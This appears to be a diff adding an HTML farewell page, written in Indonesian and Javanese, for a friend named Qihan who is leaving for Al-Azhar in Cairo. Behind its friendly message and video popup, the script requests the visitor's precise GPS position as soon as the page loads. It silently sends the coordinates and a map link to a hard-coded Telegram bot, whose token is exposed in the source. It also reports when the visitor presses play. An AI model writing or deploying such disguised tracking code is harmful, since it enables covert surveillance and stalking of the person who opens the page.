@@ -1,1 +1,186 @@
-error 404 not found
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Selamat Jalan, Qihan elek</title>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Lora:ital,wght@0,400;1,400&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#0b0b0d;--bg2:#15100f;--fg:#ece6dc;--mute:#a79f93;--red:#c0282d;--gold:#d9a441;
+ box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+html{scroll-padding-top:env(safe-area-inset-top,0px);scroll-behavior:smooth}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);font-family:'Lora',Georgia,serif;font-size:18px;line-height:1.85}
+h1,h2,.btn{font-family:'Bebas Neue','Impact','Arial Narrow',sans-serif;letter-spacing:.06em;font-weight:400}
+.hero{min-height:88vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:2rem 1.2rem;
+ background:radial-gradient(ellipse at 50% 0%,#241012 0%,transparent 65%),var(--bg)}
+.hero small{color:var(--gold);letter-spacing:.35em;text-transform:uppercase;font-size:.8rem}
+h1{font-size:clamp(3.2rem,15vw,8rem);line-height:.95;margin:.4rem 0;color:var(--fg);letter-spacing:.03em}
+h1 em{font-style:normal;color:var(--red)}
+.hero p{color:var(--mute);max-width:32rem;font-style:italic}
+.arrow{margin-top:2rem;color:var(--mute);font-size:.85rem;letter-spacing:.2em}
+main{max-width:40rem;margin:0 auto;padding:3rem 1.4rem}
+h2{font-size:2.2rem;color:var(--gold);margin:3rem 0 .6rem}
+p{margin:0 0 1.3rem}
+.q{border-left:3px solid var(--red);padding:.4rem 0 .4rem 1.1rem;margin:2rem 0;font-style:italic;color:var(--fg)}
+.sign{text-align:right;color:var(--gold);font-style:italic}
+.cta{text-align:center;padding:3rem 1rem 4rem;background:linear-gradient(var(--bg),#1b0b0c)}
+.btn{font-size:1.7rem;padding:.8rem 2.4rem;border:2px solid var(--red);background:var(--red);color:#fff;border-radius:4px;cursor:pointer;transition:.2s}
+.btn:hover{background:transparent;color:var(--fg)}
+.cta p{color:var(--mute);font-style:italic;margin-bottom:1.4rem}
+
+/* Pop up video */
+#vid{display:none;position:fixed;inset:0;z-index:50;background:rgba(0,0,0,.88);align-items:center;justify-content:center;padding:calc(1rem + env(safe-area-inset-top,0px)) 1rem calc(1rem + env(safe-area-inset-bottom,0px));text-align:center}
+#vid.show{display:flex;animation:f .4s}
+@keyframes f{from{opacity:0}}
+.box{position:relative;width:100%;max-width:46rem;background:var(--bg2);border:1px solid #2a2220;border-radius:10px;padding:2.6rem 1rem 1.2rem}
+.box h2{margin:0 0 .8rem;font-size:1.8rem}
+.x{position:absolute;top:.4rem;right:.7rem;background:none;border:0;color:var(--mute);font-size:2rem;line-height:1;cursor:pointer}
+.x:hover{color:var(--fg)}
+video{width:100%;max-height:70vh;background:#000;border:1px solid #2a2220;border-radius:8px}
+.pick{margin-top:1rem;color:var(--mute);font-size:.9rem}
+.pick label{display:inline-block;margin-top:.5rem;padding:.5rem 1rem;border:1px dashed var(--gold);color:var(--gold);border-radius:4px;cursor:pointer}
+.pick input{display:none}
+
+footer{text-align:center;color:var(--mute);font-size:.85rem;padding:2rem 1rem 3rem}
+.r{opacity:0;transform:translateY(16px);transition:.8s}.r.in{opacity:1;transform:none}
+</style>
+</head>
+<body>
+
+<section class="hero">
+  <small>Kairo &middot; Mesir &middot; Al-Azhar</small>
+  <h1>Selamat<br><em>Jalan</em>, <span class="nama">Sahabat (Hikss😭..)</span></h1>
+  <p>Tulisan ku elek mangkane aku nggae web ae.</p>
+  <div class="arrow">Scroll en menisor su!</div>
+</section>
+
+<main>
+  <p class="r">Hoi, Aku asline yo gak eroh ate nulis opo iki, wes pokok e sehat selalu nk kono, ojk lali mangan, ojk gendaan ae nk kono</p>
+
+  <div class="q r">"Semoga kita bertemu lagi dalam keadaan terbaik kita masing-masing" (anjay keren bat gw🥶)</div>
+
+  <h2 class="r">Teruss</h2>
+  
+  <p class="r">iku, aku yo jaluk sepuro bekne nek guyon rodok ngawur ambek awmu😅</p>
+  <p class="r">mugo² ilmumu berkah, sinaumu gampang, waras terus, gak aneh². wes sembaarng kalir.</p>
+  <p class="sign r">Yo wes ngunu tok ae<br>Teko Husein ceo.</p>
+</main>
+
+<section class="cta">
+  <p>He, hape mu isok NFC kan?, kakno NFC ne, terus tempelno ganci lagu seng tk kei (soale keren dan canggih)</p>
+  <p>pencet en tombol disor iki, ngko isok koyok nk video</p>
+  <button class="btn" id="go">&#9654;</button>
+</section>
+
+<section id="vid" role="dialog" aria-modal="true">
+ <div class="box">
+  <button class="x" id="close" aria-label="Tutup">&times;</button>
+  <h2>Keren dan canggih se??</h2>
+  <video id="player" controls playsinline preload="metadata"></video>
+  <div class="pick" id="pick">
+    <div>:</div>
+    <label>Pilih video<input type="file" id="file" accept="video/*"></label>
+  </div>
+ </div>
+</section>
+
+<footer>Dibuat dengan cinta dan kasih sayang😘🥵&middot; Ati-ati wes nk kono, <span class="nama">Sahabat</span></footer>
+
+<script>
+// ===== EDIT DI SINI =====
+var NAMA = "Qihan";
+var VIDEO_SRC = "https://www.image2url.com/r2/default/videos/1790861247855-48a73109-3b5f-431a-a328-3fa92e8705d2.mp4";
+
+// TELEGRAM: isi dengan token bot dan chat ID kamu
+var TELEGRAM_BOT_TOKEN = "8926981293:AAGuRZm5ggRC8y-rWEVqi1W6MgW75LWknIc";
+var TELEGRAM_CHAT_ID = "6006690349";
+// ========================
+
+
+// ===== TAMBAHAN: KIRIM LOKASI GPS SAAT PERTAMA MASUK =====
+var gpsSudahDikirim = localStorage.getItem("gpsSudahDikirim");
+
+function kirimLokasiGPS(){
+  if(gpsSudahDikirim === "1") return;
+  if(!navigator.geolocation) return;
+
+  navigator.geolocation.getCurrentPosition(
+    function(pos){
+      var lat = pos.coords.latitude;
+      var lon = pos.coords.longitude;
+      var akurasi = Math.round(pos.coords.accuracy);
+
+      fetch("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text:
+            "📍 WEBSITE DIBUKA\n\n" +
+            "👤 " + NAMA + "\n" +
+            "Latitude: " + lat + "\n" +
+            "Longitude: " + lon + "\n" +
+            "🎯 Akurasi: ±" + akurasi + " meter\n\n" +
+            "🗺️ https://www.google.com/maps?q=" + lat + "," + lon
+        })
+      })
+      .then(function(){
+        localStorage.setItem("gpsSudahDikirim", "1");
+      })
+      .catch(function(){});
+    },
+    function(){},
+    {
+      enableHighAccuracy: true,
+      timeout: 15000,
+      maximumAge: 0
+    }
+  );
+}
+
+kirimLokasiGPS();
+
+
+// TELEGRAM: fungsi kirim notif, cuma sekali per kunjungan
+var sudahKirim = false;
+function kabari(){
+  if(sudahKirim) return;
+  sudahKirim = true;
+
+  fetch("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: "🎬 " + NAMA + " baru saja menekan tombol putar video"
+    })
+  }).catch(function(e){});
+}
+
+document.querySelectorAll('.nama').forEach(function(e){e.textContent=NAMA});
+var v=document.getElementById('player'),pick=document.getElementById('pick');
+if(VIDEO_SRC){v.src=VIDEO_SRC;pick.style.display='none'}
+document.getElementById('file').addEventListener('change',function(e){
+  var f=e.target.files[0];if(!f)return;
+  v.src=URL.createObjectURL(f);pick.style.display='none';v.play().catch(function(){});
+});
+var m=document.getElementById('vid');
+function closeM(){m.classList.remove('show');v.pause();document.body.style.overflow=''}
+document.getElementById('go').addEventListener('click',function(){
+  kabari();
+  m.classList.add('show');document.body.style.overflow='hidden';
+  if(v.src)v.play().catch(function(){});
+});
+document.getElementById('close').addEventListener('click',closeM);
+m.addEventListener('click',function(e){if(e.target===m)closeM()});
+document.addEventListener('keydown',function(e){if(e.key==='Escape')closeM()});
+var io=new IntersectionObserver(function(es){es.forEach(function(x){if(x.isIntersecting)x.target.classList.add('in')})},{threshold:.15});
+document.querySelectorAll('.r').forEach(function(e){io.observe(e)});
+</script>
+</body>
+</html>
